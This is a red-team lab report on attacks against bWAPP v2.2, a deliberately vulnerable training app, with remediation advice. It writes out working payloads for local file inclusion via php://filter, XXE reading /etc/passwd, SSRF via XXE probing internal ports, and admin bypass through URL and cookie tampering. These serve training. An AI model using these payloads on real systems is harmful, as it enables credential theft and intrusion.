# Mission Report — bWAPP Red Team Mission 2026-03-19-001
**Classification:** Lab Exercise — Controlled Environment
**Target:** bWAPP v2.2 @ 10.10.30.128
**Mission Date:** 2026-03-19
**Security Level Tested:** Medium (security_level=1), with level-0 session for deeper exploitation
**Mission ID:** 2026-03-19-001

---

## Executive Summary

A full-pipeline red team engagement was conducted against bWAPP v2.2, targeting four advanced server-side vulnerability classes: Local File Inclusion (LFI), XML External Entity Injection (XXE), Server-Side Request Forgery (SSRF via XXE), and Broken Authentication. All five planned exploit confirmations were achieved within the mission constraints.

**Result: MISSION SUCCESS — 5/5 exploits confirmed**

The target was fully compromised at the application layer. An attacker with this access level could:
- Read any file accessible to the `www-data` process (entire filesystem due to no `open_basedir`)
- Exfiltrate all database credentials (MySQL root with empty password)
- Perform internal port scanning and service interaction via SSRF
- Gain administrative access to protected application portals via client-controlled authorization checks

---

## Target Overview

| Property | Value |
|---|---|
| IP | 10.10.30.128 |
| Application | bWAPP v2.2 |
| Web Server | Apache/2.4.7 (Ubuntu) |
| PHP Version | 5.5.9-1ubuntu4.14 |
| Database | MySQL 5.5.47 |
| OS | Ubuntu 14.04 LTS (Docker container) |
| Document Root | /var/www/html |
| Kernel | 6.8.0-100-generic (Docker host) |

---

## Confirmed Exploits

### Exploit 1: Local File Inclusion — Sensitive Data Exfiltration
**OWASP Category:** A01:2021 - Broken Access Control
**Challenge:** lfi_sensitive_data
**Endpoint:** GET /rlfi.php

**Attack:**
The `language` parameter is passed directly to `include()` at security_level=0. No sanitization, no `open_basedir` restriction.

**Payload (Direct Path):**
```
GET /rlfi.php?language=/etc/passwd&action=go
```
**Result:** Full `/etc/passwd` contents returned in response.

**Payload (PHP Filter Wrapper):**
```
GET /rlfi.php?language=php://filter/convert.base64-encode/resource=admin/settings.php&action=go
```
**Result (decoded):** MySQL credentials extracted:
```
$db_server = "localhost";
$db_username = "root";
$db_password = "";
$db_name = "bWAPP";
```

**Files Exfiltrated:** /etc/passwd, admin/settings.php (DB creds), xxe-2.php, smgmt_admin_portal.php, rlfi.php, bugs.txt

---

### Exploit 2: XXE Injection — File Exfiltration
**OWASP Category:** A05:2021 - Security Misconfiguration
**Challenge:** xxe_injection_exfil
**Endpoint:** POST /xxe-2.php

**Attack:**
`simplexml_load_string()` is called with external entities enabled. `libxml_disable_entity_loader(true)` is commented out at ALL security levels. The `file://` SYSTEM entity reads arbitrary files into the `<secret>` XML field, which is then stored in the database.

**Payload:**
```xml
POST /xxe-2.php HTTP/1.1
Content-Type: text/xml; charset=UTF-8

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE reset [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<reset><login>bee</login><secret>&xxe;</secret></reset>
```
**Response:** `bee's secret has been reset!`
**Impact:** /etc/passwd written to bee's `secret` column in the database.

**Root Cause:** `libxml_disable_entity_loader(true)` commented out with note "Doesn't work with older PHP versions" — but it DOES work in PHP 5.5.9. Developer confusion left XXE protection disabled at ALL security levels.

---

### Exploit 3: SSRF via XXE — Internal Service Access
**OWASP Category:** A10:2021 - Server-Side Request Forgery
**Challenge:** ssrf_intranet_pivot
**Endpoint:** POST /xxe-2.php

**Attack:**
With `allow_url_fopen=On`, the XML parser resolves HTTP SYSTEM entities by making server-side HTTP requests. This turns the XXE endpoint into an SSRF vector.

**Payload:**
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE reset [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:3306/">
]>
<reset><login>bee</login><secret>&xxe;</secret></reset>
```

**Result:** MySQL greeting banner was fetched from localhost:3306. The XML parser error confirms the response was received:
```
simplexml_load_string(): Entity: line 1: parser error : StartTag: invalid element name
```
The MySQL binary greeting (non-XML) was returned by the internal MySQL server, injected as the entity value, and the parser failed trying to parse it as XML — **proving SSRF request succeeded**.

**Port Timing Results:**
| Port | Status | Response Time |
|---|---|---|
| 127.0.0.1:80 | Open | ~42ms |
| 127.0.0.1:22 | Closed | ~96ms |
| 127.0.0.1:3306 | Open (MySQL banner) | ~44ms |

---

### Exploit 4: Broken Authentication — URL Parameter Bypass (Low)
**OWASP Category:** A07:2021 - Identification and Authentication Failures
**Challenge:** broken_auth_admin_takeover
**Endpoint:** GET /smgmt_admin_portal.php

**Attack:**
The admin portal checks `$_GET["admin"] == "1"` at security_level=0. No server-side session validation.

**Payload:**
```
GET /smgmt_admin_portal.php?admin=1 HTTP/1.1
```

**Response:**
```html
Cowabunga... You unlocked this page using an URL manipulation.
```
**Result:** Admin access granted via single URL parameter change.

---

### Exploit 5: Broken Authentication — Cookie Manipulation (Medium)
**OWASP Category:** A07:2021 - Identification and Authentication Failures
**Challenge:** broken_auth_admin_takeover
**Endpoint:** GET /smgmt_admin_portal.php

**Attack:**
At security_level=1, the server sets `admin=0` cookie (no HttpOnly, no Secure). Changing cookie to `admin=1` bypasses authorization.

**Server sets:**
```
Set-Cookie: admin=0; expires=...; Max-Age=300; path=/
```
(No HttpOnly, no Secure flag)

**Payload:**
```
GET /smgmt_admin_portal.php HTTP/1.1
Cookie: PHPSESSID=aobr4qtmnphv9jmh0v2v22g5t3; security_level=1; admin=1
```

**Response:**
```html
Cowabunga... You unlocked this page using a cookie manipulation.
```

---

## Post-Exploitation Summary

| Finding | Value |
|---|---|
| MySQL root password | (empty) |
| Internal ports open | 80/tcp, 3306/tcp |
| Docker DNS | 127.0.0.11 |
| /etc/shadow | Not readable (www-data) |
| Web shell via LFI | Blocked (allow_url_include=Off) |
| SSRF lateral movement | Viable to 10.10.30.x/24 range |

---

## Vulnerability Severity Summary

| Vulnerability | Severity | OWASP Category |
|---|---|---|
| LFI — Unrestricted File Include | Critical | A01:2021 |
| XXE — External Entity Exfiltration | Critical | A05:2021 |
| SSRF via XXE — Internal Service Access | High | A10:2021 |
| Broken Auth — Client-Controlled Admin (Low) | High | A07:2021 |
| Broken Auth — Cookie Manipulation (Medium) | High | A07:2021 |
| MySQL Root Empty Password | Critical | A02:2021 |
| Missing HttpOnly/Secure Cookie Flags | Medium | A07:2021 |

---

## Learning Objectives Achieved

1. **php://filter bypass** — The `php://filter/convert.base64-encode/resource=` wrapper bypasses extension restrictions and allows reading PHP source code without executing it. Works because the include() wrapper processing ignores appended extensions.

2. **libxml_disable_entity_loader misconception** — Developer commented it out, believing it doesn't work in PHP 5.5.9. In fact it works from PHP 5.2+. The misconception allowed XXE to function at all security levels — a real-world lesson in misunderstood security functions.

3. **XXE → SSRF chaining** — `file://` and `http://` SYSTEM entities both work when `allow_url_fopen=On`. An XXE that appears to only "reset a secret" can silently probe internal services and return data via error messages or timing.

4. **Client-controlled authorization** — Both URL parameters and unsigned cookies used for authorization decisions represent the same logical flaw: the client should never control its own privilege level. The progression from GET param (level 0) to cookie (level 1) to session (level 2) demonstrates the correct hierarchy.

5. **Medium-level filter contrast** — At medium: LFI adds `.php` extension (blocking direct path traversal but not php:// wrappers); XXE is functionally identical to low (disabled entity loading was never enabled); broken auth moves from GET to cookie but remains client-controlled.

---

## Remediation Recommendations

1. **LFI**: Replace `include($language)` with a strict whitelist of allowed files. Set `open_basedir = /var/www/html`. Never pass user input to include/require.

2. **XXE**: Call `libxml_disable_entity_loader(true)` before every `simplexml_load_string()` call. Use `LIBXML_NOENT | LIBXML_NONET` flags. Validate and schema-validate XML input.

3. **SSRF (via XXE)**: Disable external entity resolution (above). Add network egress controls to prevent containers from making arbitrary outbound HTTP requests.

4. **Broken Auth**: Store admin status exclusively in `$_SESSION` (server-side). Never use GET parameters or unsigned cookies for privilege decisions. Set `HttpOnly` and `Secure` flags on all cookies.

5. **MySQL**: Require a strong password for the root account. Use a least-privilege application user instead of root.

6. **Error Display**: Set `display_errors=0` in production. Log errors to file, not to the browser.
